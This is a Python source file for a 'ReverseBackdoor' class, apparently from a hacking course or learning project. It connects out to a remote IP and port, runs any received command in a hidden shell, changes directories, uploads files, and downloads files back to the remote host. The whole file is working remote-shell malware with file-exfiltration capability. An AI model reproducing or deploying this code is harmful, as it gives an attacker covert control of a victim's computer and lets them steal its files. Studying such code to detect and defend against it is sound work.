#!/usr/env/bin python

import socket
import subprocess
import json
import os
import base64
import sys


class ReverseBackdoor:

    def __init__(self, remoteIP, remotePort):

        # set class attributes
        self.connection = socket.socket(socket.AF_INET,
                                        socket.SOCK_STREAM)  # create instance of the socket object | set TCP socket connection
        self.connection.connect((remoteIP,
                                 remotePort))  # establish connection to remote machine with IP/port | connect method expects tuple so wrap in ()

    # Serialize as JSON and send
    def reliableSend(self, data):
        jsonData = json.dumps(data)
        # self.connection.send(jsonData)  # py2
        self.connection.send(jsonData.encode())  # py3

    # Deserialize JSON data and return
    def reliableReceive(self):
        # jsonData = ""  # create an empty string | py2
        jsonData = b""  # create an empty byte string | py3
        while True:  # create infinite loop to collect all data from the TCP stream in the pipe
            try:  # check to see if all data has been collected and JSON deserialization can occur
                jsonData = jsonData + self.connection.recv(
                    1024)  # update the empty string with 1024 bytes of data plus whatever already is in the jsonData var
                return json.loads(jsonData)
            except ValueError:  # if error occurs continue to collect data from stream until fully collected
                continue

    # Run command on target
    @staticmethod
    def exeSystemCommand(command):
        # DEVNULL = open(os.devnull, 'wb')  # py2 devnull will open the program on any OS system and opening the file in bytes
        # return subprocess.check_output(command, shell=True, stderr=DEVNULL,
        #                                stdin=DEVNULL)
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL,
                                       stdin=subprocess.DEVNULL)  # py3 to hide the shell that launches when running exe backdoor

    # Change working directory
    @staticmethod
    def changeWorkingDir(path):
        try:  # try to run the os change dir path
            os.chdir(path)
            return "[+] Changing Working Directory"
        except WindowsError:  # except if the path cannot be found
            return "[-] The system cannot find the file/dir named " + path
    @staticmethod
    def writeFile(path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Target received file successfully"

    # Open the file to be transferred and read as bytes
    @staticmethod
    def readFile(path):  # read the file bytes of the requested file from listener
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())  # encode it in base64 to prevent unknown character errors

    # Run the backdoor listener
    def startListening(self):
        while True:  # keep the target listener open until needing to be closed
            command = self.reliableReceive()  # set the buffer bytes | pauses the program waiting for a command

            try:  # keep the socket connection alive no matter what exception occurs
                if command[0] == "exit":  # look for exit in command and kill backdoor connection
                    self.connection.close()
                    sys.exit()  # does not show error messages upon closing
                elif command[0] == 'cd' and len(command) > 1:  # look for the command 'cd' with an argument path
                    resultCommand = self.changeWorkingDir(command[1])
                elif command[0] == "download":  # look for the command 'download'
                    # resultCommand = self.readFile(command[1])  # py2
                    resultCommand = self.readFile(command[1]).decode()  # py3
                elif command[0] == "upload":
                    resultCommand = self.writeFile(command[1], command[2])
                else:
                    # resultCommand = self.exeSystemCommand(command)  # py2 | pass the output of command to remote host
                    resultCommand = self.exeSystemCommand(command).decode()  # py3 | pass the output of command to remote host
            except Exception:
                resultCommand = "[-] Error during command execution"
            self.reliableSend(resultCommand)
